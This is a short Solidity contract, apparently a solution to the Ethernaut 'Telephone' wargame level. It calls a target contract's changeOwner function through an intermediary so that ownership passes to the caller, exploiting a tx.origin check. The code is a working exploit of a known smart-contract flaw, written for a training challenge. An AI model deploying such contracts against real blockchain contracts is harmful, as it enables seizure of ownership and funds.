// deploy in remix IDE
contract Attacker {
    Telephone decoy;
    function changeOwnership(address _addr) public {
        decoy = Telephone(_addr);
        decoy.changeOwner(msg.sender);
    }
}